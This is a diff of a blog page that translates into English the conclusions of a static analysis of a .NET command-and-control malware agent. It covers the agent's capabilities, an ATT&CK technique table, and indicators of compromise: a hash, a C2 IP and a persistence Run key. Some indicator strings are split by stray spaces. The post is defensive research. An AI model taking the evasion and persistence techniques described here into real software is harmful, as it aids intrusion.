+  <a href="#3-conclusions" class="h-anchor" aria-hidden="true">#</a>
 </h2>
-<p>Cuando comencé a escribir este artículo creí que sería la parte final del análisis; sin embargo, luego de identificar la cantidad de funciones que el agente exponía, preferí entrar a detalle en algunas y dejar el análisis dinámico para el siguiente artículo.</p>
-<p>El malware analizado tiene todas las características de un agente de Comando y Control: se contacta con el servidor cada cierto tiempo, permite obtener información del sistema, permite exfiltrar información, permite descargar binarios al sistema y ejecutarlos, entre otras funciones.</p>
-<p>El malware utiliza un par de técnicas para evalidar herramientas de análisis de código estático: uso de subguiones para alterar nombres de variables/llaves de registro, así como el uso de un arreglo de bytes para almacenar una IP en vez de almacenarla en plano; aún así, el que haya sido desarrollado en .NET permite su fácil decompilación y análisis.</p>
-<p>En el próximo artículo detallaré como alguien puede interactuar con el malware como parte de su análisis, y así evidenciar si tiene alǵun comportamiento no identificado como parte del análisis estático.</p>
-<h2 id="4-mapeo-mitre-attck">
-  4. Mapeo MITRE ATT&amp;CK
-  <a href="#4-mapeo-mitre-attck" class="h-anchor" aria-hidden="true">#</a>
+<p>When I started writing this article I thought it would be the final part of the analysis; however, after identifying the number of functions that the agent exposed, I preferred to go into detail on some of them and leave the dynamic analysis for the next article.</p>
+<p>The analyzed malware has all the characteristics of a Command and Control agent: it contacts the server from time to time, allows obtaining information from the system, allows exfiltrating information, allows downloading binaries to the system and executing them, among other functions.</p>
+<p>The malware uses a couple of techniques to bypass static code analysis tools: the use of underscores to alter variable names/registry keys, as well as the use of a byte array to store an IP instead of storing it in plaintext; however, the fact that it has been developed in .NET allows for easy decompilation and analysis.</p>
+<p>In the next article I will elaborate on how someone can interact with the malware as part of their analysis, and thus evidence whether it has any unidentified behavior not identified as part of the static analysis.</p>
+<h2 id="4-mitre-attck-mapping">
+  4. MITRE ATT&amp;CK Mapping
+  <a href="#4-mitre-attck-mapping" class="h-anchor" aria-hidden="true">#</a>
 </h2>
 <table>
 <thead>
 <tr>
 <th>ID</th>
-<th>Táctica</th>
-<th>Técnica</th>
-<th>Descripción</th>
+<th>Tactic</th>
+<th>Technique</th>
+<th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>T1059.003</td>
-<td>Ejecución</td>
+<td>Execution</td>
 <td>Command and Scripting Interpreter: Windows Command Shell</td>
-<td>Se utilizó el método Process.Start para iniciar nuevos procesos</td>
+<td>The method Process.Start was used to initiate new processes</td>
 </tr>
 <tr>
 <td>T1547.001</td>
-<td>Persistencia</td>
+<td>Persistence</td>
 <td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</td>
-<td>Se utilizó una llave de registro para establecer persistencia</td>
+<td>A registry key was used to stablish persistence</td>
 </tr>
 <tr>
 <td>T1070.004</td>
-<td>Evasión de defensas</td>
+<td>Defence evasion</td>
 <td>Indicator Removal: File Deletion</td>
-<td>El agente tiene la capacidad de eliminar archivos</td>
-</tr>
-<tr>
-<td>T1057</td>
-<td>Descubrimiento</td>
-<td>Process Discovery</td>
-<td>El agente tiene la capacidad de listar procesos</td>
-</tr>
-<tr>
-<td>T1082</td>
-<td>Descubrimiento</td>
-<td>System Information Discovery</td>
-<td>El agente tiene la capacidad de obtener información del sistema</td>
+<td>The agent has the capability to delete files</td>
 </tr>
 <tr>
 <td>T1027.010</td>
-<td>Evasión de defensas</td>
+<td>Defence evasion</td>
 <td>Obfuscated Files or Information: Command Obfuscation</td>
-<td>Se utilizó el reemplazo de caracteres para ofuscar comandos</td>
+<td>Character substitution was used to obfuscate commands</td>
+</tr>
+<tr>
+<td>T1057</td>
+<td>Discovery</td>
+<td>Process Discovery</td>
+<td>The agent has the capability to list processes</td>
+</tr>
+<tr>
+<td>T1082</td>
+<td>Discovery</td>
+<td>System Information Discovery</td>
+<td>The agent has the capability to obtain information about the system</td>
 </tr>
 <tr>
 <td>T1113</td>
-<td>Colección</td>
+<td>Collection</td>
 <td>Screen Capture</td>
-<td>El agente tiene la capacidad de sacar capturas de pantalla</td>
+<td>The agent has the capability to take screenshots</td>
 </tr>
 <tr>
 <td>T1005</td>
-<td>Colección</td>
+<td>Collection</td>
 <td>Data from Local System</td>
-<td>El agente tiene la capacidad de obtener información de archivos del sistema</td>
+<td>The agent has the capability to obtain information about the system&rsquo;s files</td>
 </tr>
 <tr>
 <td>T1571</td>
-<td>Comando y Control</td>
+<td>Command and Control</td>
 <td>Non-Standard Port</td>
-<td>El agente no utiliza puertos comunes para comunicarse con el servidor de C2</td>
+<td>The agent communicates using a non-standard port</td>
 </tr>
 <tr>
 <td>T1095</td>
-<td>Comando y Control</td>
+<td>Command and Control</td>
 <td>Non-Application Layer Protocol</td>
-<td>El agente se comunica mediante TCP, interactuando directo con el flujo de datos</td>
+<td>The agent communicates directly through a TCP connection</td>
 </tr>
 <tr>
 <td>T1041</td>
-<td>Comando y Control</td>
+<td>Command and Control</td>
 <td>Exfiltration Over C2 Channel</td>
-<td>El agente exfiltra información utilizando la conexión establecida con el servidor de C2</td>
+<td>The agent exfiltrates information using the connection with the C2 server</td>
 </tr>
 </tbody>
 </table>
@@ -573,19 +573,19 @@
 </thead>
 <tbody>
 <tr>
-<td>59211a4e0f27d70 c659636746b61945a</td>
+<td>59211a4e0f27d70c659 636746b61945a</td>
 <td>Hash MD5</td>
-<td>Hash del agente de C2</td>
+<td>C2 agent hash</td>
 </tr>
 <tr>
 <td>162.245.191.217</td>
 <td>IP</td>
-<td>IP a donde se comunica el agente</td>
+<td>IP that the agent calls</td>
 </tr>
 <tr>
-<td>HKEY_CURRENT_USER\ Software\Microsoft \Windows\CurrentVersion\ Run\haijwivetsgVr</td>
+<td>HKEY\CURRENT \USER\Software \Microsoft\Windows \CurrentVersion \Run\haijwivetsgVr</td>
 <td>Llave de registro</td>
-<td>Llave que el agente utiliza para establecer persistencia</td>
+<td>Registry key used to establish persistence</td>
 </tr>
 </tbody>
 </table>
@@ -596,7 +596,7 @@
         <div class="pagination">
           <div class="pagination__title">
             <span class="pagination__title-h"
-              >Leer otras publicaciones</span
+              >Read other posts</span
             >
             <hr />
           </div>
@@ -604,8 +604,8 @@
             
             
               <span class="button next">
-                <a href="/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">
-                  <span class="button__text">003 - Analizando un agente de C2 - Parte 1: el Dropper</span>
+                <a href="/en/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">
+                  <span class="button__text">003 - Analyzing a C2 agent - Part 1: The Dropper</span>
                   <span class="button__icon">→</span>
                 </a>
               </span>
